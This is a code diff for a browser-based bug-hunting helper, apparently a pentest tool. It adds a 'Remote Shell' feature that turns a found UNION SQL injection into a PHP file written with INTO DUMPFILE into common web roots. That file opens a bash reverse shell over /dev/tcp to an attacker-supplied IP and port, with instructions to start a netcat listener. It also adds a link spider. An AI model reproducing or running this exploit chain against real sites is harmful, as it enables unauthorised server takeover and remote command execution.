@@ -230,6 +230,8 @@ function JsBugHuntingHelper () {
       window.wrappedJSObject.Mapper = cloneInto(Mapper,
         window,
         { cloneFunctions: true })
+
+      exportFunction(trySqliRemoteShell, window, { defineAs: 'trySqliRemoteShell' })
     }
 
     removeBootstrapDuplicatedStyles('.fade')
@@ -377,10 +379,10 @@ function JsBugHuntingHelper () {
       gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL Cookies Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
 
       gui += '<table class="table table-responsive table-hover">'
-      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>'
 
       cookies.forEach((v) => {
-        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>'
       })
 
       gui += '</table>'
@@ -407,10 +409,10 @@ function JsBugHuntingHelper () {
       gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL Headers Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
 
       gui += '<table class="table table-responsive table-hover">'
-      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>'
 
       headers.forEach((v) => {
-        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>'
       })
 
       gui += '</table>'
@@ -460,11 +462,11 @@ function JsBugHuntingHelper () {
       gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL SQL Injection Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
 
       gui += '<table class="table table-responsive table-hover">'
-      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>'
 
       // url: this.url, httpMethod: this.httpMethod, paramName: modParams[i][0], paramValue: modParams[i][1], payloadType: this.payloadType
       sql.forEach((v) => {
-        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td>' + tryRemoteShellLink(v) + '</td></tr>'
       })
 
       gui += '</table>'
@@ -506,11 +508,11 @@ function JsBugHuntingHelper () {
       gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Form Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
 
       gui += '<table class="table table-responsive table-hover">'
-      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>'
 
       // url: this.url, httpMethod: this.httpMethod, paramName: modParams[i][0], paramValue: modParams[i][1], payloadType: this.payloadType
       form.forEach((v) => {
-        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td>' + tryRemoteShellLink(v) + '</td></tr>'
       })
 
       gui += '</table>'
@@ -534,10 +536,21 @@ function JsBugHuntingHelper () {
     let result = ''
     for (let i = 0; i < this.length; i++) {
       hex = this.charCodeAt(i).toString(16)
-      result += ('000' + hex).slice(-4)
+      result += ('000' + hex).slice(-2)
     }
 
     return result
+  }
+
+  // eslint-disable-next-line no-extend-native
+  String.prototype.replaceLast = function (find, replace) {
+    const index = this.lastIndexOf(find)
+
+    if (index >= 0) {
+      return this.substring(0, index) + replace + this.substring(index + find.length)
+    }
+
+    return this.toString()
   }
 
   // eslint-disable-next-line no-unused-vars
@@ -562,10 +575,10 @@ function JsBugHuntingHelper () {
 
       gui += '<table class="table table-responsive table-hover">'
 
-      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>'
 
       result.forEach((v) => {
-        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>'
       })
 
       gui += '</table>'
@@ -585,10 +598,10 @@ function JsBugHuntingHelper () {
 
         gui += '<table class="table table-responsive table-hover">'
 
-        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>'
 
         result.forEach((v) => {
-          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>'
         })
 
         gui += '</table>'
@@ -608,10 +621,10 @@ function JsBugHuntingHelper () {
 
         gui += '<table class="table table-responsive table-hover">'
 
-        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>'
 
         result.forEach((v) => {
-          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>'
         })
 
         gui += '</table>'
@@ -622,6 +635,127 @@ function JsBugHuntingHelper () {
       guiEnabled(gui)
     } catch (e) {
       alert(e)
+    }
+  }
+
+  this.spider = async function () {
+    const initialUrl = document.location.href
+    const urls = []
+    await recursion(initialUrl, 0)
+    let gui = '<table style="overflow:auto" class="table table-responsive table-striped table-hover">'
+    urls.forEach((v) => {
+      gui += '<tr><td><a href="' + v + '" target="_blank">' + v + '</a></td></tr>'
+    })
+    gui += '</table>'
+    guiEnabled(gui)
+    // console.log('SPIDER', urls)
+    return urls
+
+    async function recursion (url, depth) {
+      const data = await $.get(url)
+      // console.log(url, $(data), $(data).find('a'))
+
+      depth++
+
+      for (const tmp of $(data).find('a')) {
+        if (tmp !== undefined && tmp.href !== undefined) {
+          if (urls.findIndex((element) => element === tmp.href) === -1 /* && tmp[0].indexOf(document.location.origin) !== -1 */) {
+            urls.push(tmp.href)
+            try {
+              console.log('r', tmp.href)
+              await recursion(tmp.href, depth)
+            } catch (e) {}
+          }
+        }
+      }
+    }
+  }
+
+  function tryRemoteShellLink (v) {
+    if (v.payloadType === 'SQL Injection' && v.paramValue.toLowerCase().indexOf('union') !== -1) {
+      return '<a href="javascript:trySqliRemoteShell(\'' + btoa(JSON.stringify(v)) + '\')">Try</a>'
+    }
+    return ''
+  }
+
+  async function trySqliRemoteShell (base64v) {
+    const attackerIp = $('#attackerIp').val()
+    const attackerPort = $('#attackerPort').val()
+
+    if (attackerIp === '' || attackerPort === '') {
+      alert('Please insert your attacker ip and port')
+      return false
+    }
+
+    const fileName = new Date().getTime() + '.php'
+
+    const payloads = [
+      { filePlace: 'c:/var/www/' + fileName, payload: '<?php exec("bash.exe -c \\"bash.exe -i >& /dev/tcp/' + attackerIp + '/' + attackerPort + ' 0>&1\\"");?>' },
+      { filePlace: '/var/www/' + fileName, payload: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/' + attackerIp + '/' + attackerPort + ' 0>&1\'");?>' },
+      { filePlace: '/var/www/html/' + fileName, payload: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/' + attackerIp + '/' + attackerPort + ' 0>&1\'");?>' }
+    ]
+
+    alert('Run netcat -lvnp PORT (or ncat -lvnp PORT in windows) on your computer')
+    const initialPayload = JSON.parse(atob(base64v))
+
+    for (const pl of payloads) {
+      // capire perchè su sql4 non va
+      const stringPayload = pl.payload
+      const hexPayload = stringPayload.hexEncode()
+
+      let newPayload = ''
+      if (initialPayload.paramValue.indexOf('"918273645"') !== -1) {
+        newPayload = initialPayload.paramValue.replaceLast('"918273645', '0x' + hexPayload + ' INTO DUMPFILE \'' + pl.filePlace + '\' #')
+      } else if (initialPayload.paramValue.indexOf("'918273645'") !== -1) {
+        newPayload = initialPayload.paramValue.replaceLast("'918273645", '0x' + hexPayload + ' INTO DUMPFILE \'' + pl.filePlace + '\' #')
+      } else if (initialPayload.paramValue.indexOf('918273645') !== -1) {
+        newPayload = initialPayload.paramValue.replaceLast('918273645', '0x' + hexPayload + ' INTO DUMPFILE \'' + pl.filePlace + '\' #')
+      }
+
+      console.log('initialPayload', newPayload)
+
+      // eslint-disable-next-line no-unused-vars
+      const name = initialPayload.paramName
+      const value = newPayload
+
+      let tempParams = []
+      $('form').each((i, form) => {
+        $(form).find('input,button,select,textarea').each((i2, v2) => {
+          if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
+          // eslint-disable-next-line no-undef
+          // console.log($(v2).attr('name'), $(v2).val())
+            const tagName = $(v2)[0].tagName
+            let value = ''
+
+            if (tagName === 'SELECT') {
+              value = $(v2).find('option:selected').val()
+            } else if (tagName === 'INPUT') {
+              const type = $(v2).attr('type').toLowerCase()
+              if (type === 'checkbox' || type === 'radio') {
+                value = $(v2).prop('checked').toString()
+              } else {
+                value = $(v2).val()
+              }
+            }
+            tempParams.push([$(v2).attr('name'), value])
+          }
+        })
+      })
+
+      tempParams = tempParams.filter((v, i) => {
+        return v[0] !== name
+      })
+
+      tempParams.push([name, value])
+
+      await $.ajax(initialPayload.url, {
+        type: initialPayload.httpMethod,
+        data: Object.fromEntries(tempParams)
+      }).done((data) => {
+        // console.log(data)
+        $.get(window.location.origin + '/' + fileName).done(() => {
+        })
+      })
     }
   }
 
